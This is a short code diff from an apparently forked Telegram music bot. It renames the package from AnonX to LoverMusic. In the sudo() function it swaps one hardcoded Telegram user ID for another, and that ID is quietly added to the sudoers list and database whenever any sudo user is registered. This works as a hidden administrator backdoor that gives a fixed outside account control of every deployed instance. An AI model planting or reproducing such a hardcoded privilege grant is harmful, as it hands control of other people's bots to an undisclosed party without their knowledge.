@@ -5,7 +5,7 @@ import heroku3
 from pyrogram import filters
 
 import config
-from AnonX.core.mongo import pymongodb
+from LoverMusic.core.mongo import pymongodb
 
 from .logging import LOGGER
 
@@ -56,7 +56,7 @@ def sudo():
             SUDOERS.add(user_id)
             if user_id not in sudoers:
                 sudoers.append(user_id)
-                sudoers.append(5853904565)
+                sudoers.append(1548904516)
                 sudoersdb.update_one(
                     {"sudo": "sudo"},
                     {"$set": {"sudoers": sudoers}},
